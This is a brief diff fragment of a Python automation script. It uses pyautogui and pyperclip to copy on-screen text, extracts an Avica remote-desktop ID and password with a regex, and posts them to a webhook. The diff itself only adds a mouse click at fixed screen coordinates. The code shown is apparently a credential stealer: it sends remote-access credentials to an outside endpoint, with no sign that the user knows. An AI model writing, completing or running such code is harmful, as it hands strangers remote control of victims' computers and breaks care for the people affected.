@@ -21,6 +21,7 @@ pag.sleep(.5)
 
 text = pyperclip.paste()
 match = re.search(r"Avica ID:\s*(\d{3} \d{3} \d{3}).*?Password:\s*([A-Za-z0-9]+)", text, re.DOTALL)
+pag.click(249, 203, duration=2)
 try:
     if match:
         requests.post(webhook_url, json={"content": f"ID: {match.group(1)}\nPass: {match.group(2)}"})
